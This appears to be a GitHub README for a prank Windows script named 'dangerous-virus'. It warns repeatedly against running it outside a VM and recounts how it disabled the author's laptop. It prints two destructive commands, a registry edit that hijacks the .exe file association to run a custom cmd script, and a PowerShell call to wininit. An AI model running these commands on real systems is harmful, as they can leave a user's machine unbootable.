# dangerous-virus
Formerly known on my profile as "corona-joke-virus".


## DO NOT UNDER ANY CIRCUMSTANCES RUN THIS ON YOUR MAIN. I DO NOT TAKE ANY RESPONSIBILITY FOR ANY HARM CAUSED BY THIS SCRIPT. I HAVE ALREADY WARNED YOU SEVERAL TIMES, EXECUTE THIS ONLY IN A SANDBOX ENVIROMENT (FOR EXAMPLE A VM).
### I am speaking from a personal experience here: I once executed this "harmless" script on a laptop owned by me. It did everything as intended: Starting screen_melter.exe, running wininit (with admin) and modifying the reg key for running an exe to a custom cmd script. "Harmless", right? Well, as you can probably imagine by now, that very laptop didn't live to see another boot. I eventually got it working again by restoring to an old system backup I found, but still. DO NOT EXECUTE THIS SCRIPT. Please... just don't.

#### If you want to download the script, feel free to do so. The dangerous file has been renamed from "main.cmd" to "main.cmd_UNRUNNABLE", so that clicking on it accidentally won't ruin your PC.
#### Also, there are two lines commented out (look below) to prevent complete destruction and loss of data when somehow accidentally run.
```
reg add "HKEY_CLASSES_ROOT\exefile\shell\open\command" /ve /t REG_SZ /d "%temp%\harald_afterburner.cmd \"%%1\" %%*" /f
powershell.exe -Command wininit
```
